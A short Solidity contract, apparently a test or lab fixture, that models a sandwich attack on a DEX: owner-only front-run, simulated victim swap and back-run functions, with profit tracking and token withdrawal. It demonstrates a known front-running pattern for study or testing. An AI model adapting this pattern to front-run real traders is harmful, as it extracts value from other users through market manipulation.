// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";
import "../../interfaces/IDexMinimal.sol";

contract SandwichAttacker {
    address public owner;
    uint256 private invested;
    uint256 private returned;
    uint256 private victimAmountIn;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function frontRun(address amm, address tokenIn, uint256 amountIn) external onlyOwner {
        IERC20Minimal token = IERC20Minimal(tokenIn);
        token.transferFrom(msg.sender, address(this), amountIn);
        token.approve(amm, amountIn);
        invested = IDexMinimal(amm).swap(tokenIn, amountIn);
    }

    function executeVictimSwap(address amm, address tokenIn, uint256 amountIn) external onlyOwner {
        victimAmountIn = amountIn;
        IERC20Minimal token = IERC20Minimal(tokenIn);
        token.transferFrom(msg.sender, address(this), amountIn);
        token.approve(amm, amountIn);
        IDexMinimal(amm).swap(tokenIn, amountIn);
    }

    function backRun(address amm, address tokenOut, uint256 amountOut) external onlyOwner {
        IERC20Minimal token = IERC20Minimal(tokenOut);
        token.approve(amm, amountOut);
        returned = IDexMinimal(amm).swap(tokenOut, amountOut);
    }

    function getProfits() external view returns (uint256) {
        if (returned > invested) {
            return returned - invested;
        }
        return 0;
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
